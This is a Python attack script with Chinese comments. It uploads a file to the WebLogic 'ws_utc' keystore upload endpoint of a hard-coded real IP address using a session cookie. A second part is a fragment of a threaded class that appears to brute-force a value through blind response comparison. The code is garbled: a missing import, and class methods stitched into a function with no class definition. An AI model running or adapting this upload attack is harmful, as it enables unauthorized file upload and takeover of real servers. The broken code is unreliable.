import requests
import threading
import time


def upload(rawFile):
    url=f'http://47.74.224.5:37002/ws_utc/resources/setting/keystore?timestamp={int(time.time()*1000)}'
    
    file = {'id': (None, 'WU_FILE_0'), 
         'name':  (None, f'{random.randint(1000,9999)}sf.MP4'), 
         'type': (None, 'plan/text'),
         'lastModifiedDate': (None, 'Sat Oct 21 2019 13:20:12 GMT+0800 (中国标准时间)'),
         'size': (None,'1555'), 
         'file': (f'{random.randint(1000,9999)}sf.MP4', rawFile, 'plan/text')} # 
    headers={'Cookies':'wordpress_test_cookie=WP+Cookie+check; JSESSIONID=Mcq-T51fXGCkf7_F-mAFL-5kExiIVxL4PoLR53sXTpDjn-8xoErF!779300569'}
    r=requests.post(url=url,files=file,headers=headers)
    print(r.text)


    lock=threading.Lock()
    
    #攻击当前的位数
    def __init__(self,url,length,low,high):
        self.url=url 
        self.length=length
        self.low=low
        self.high=high
    def StartAttack(self):
        self.ResetThread(True)
        for i in range(self.maxThread):
            Runner(str(i),self).start()
    
    #获取指定序号的返回结果并存入到resultList[]
    def getResult(self):
        finished=False
        self.lock.acquire()
        self.nowIndex=self.nowIndex+1
        if(self.nowIndex>=len(self.ranges)):
            finished = self.nowCompleteCount>=len(self.ranges)
        else:
            self.getSingleResult(self.nowIndex)
        self.lock.release()
        return finished
    #处理本轮结果
    def ComsumeNowResult(self):
        if(not self.resultList[0].compare(self.resultList[1])):
            if(not self.resultList[1].compare(self.resultList[2])):
                self.nowResult+=self.ranges[1]
            else:
                self.nowResult+=self.ranges[0]
            return self.ResetThread()
        for i in range(0,len(self.resultList)):
            if(not self.resultList[i].compare(self.resultList[0])):
                targetIndex=self.resultList[i].index
  
                #print(f"index:{targetIndex}->{self.ranges[targetIndex]}({len(self.resultList[i].result)})")
                self.nowResult+=self.ranges[targetIndex]
                
                return self.ResetThread()
        print(f"{self.nowResult}:self.nowResult")
    def ResetThread(self,totalReset=False):
        #print(f"self.nowResult:{self.nowResult}")
        self.nowCompleteCount=0
        self.nowIndex=-1
        self.nowLength=1 if totalReset else self.nowLength+1
        self.resultList.clear()